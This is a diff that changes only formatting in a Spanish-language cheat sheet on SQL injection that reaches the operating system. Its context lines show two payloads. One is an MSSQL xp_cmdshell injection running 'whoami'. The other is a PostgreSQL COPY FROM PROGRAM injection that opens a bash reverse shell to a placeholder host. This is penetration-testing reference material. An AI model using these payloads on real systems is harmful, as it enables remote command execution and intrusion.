@@ -14,7 +14,7 @@ linked:
 ---
 # SQL - Interacción Especial y Archivos
 
-***
+---
 
 ## Cheatsheet
 
@@ -82,7 +82,7 @@ P2="'; EXEC master..xp_cmdshell 'whoami'-- -"
 PAYLOAD="'; CREATE TABLE x(x text); COPY x FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"'-- -"
 ```
 
-___
+---
 
 ## Overview
 
@@ -99,4 +99,4 @@ Funciones que cruzan la frontera SQL ↔ OS. Vector más severo de SQLi — **RC
 
 Modern hardening: estos privs son default-off en stacks recientes. Bug bounty target = apps que ejecutan queries como `root`/`sa`/`postgres` (legacy/lazy config).
 
-***
+---
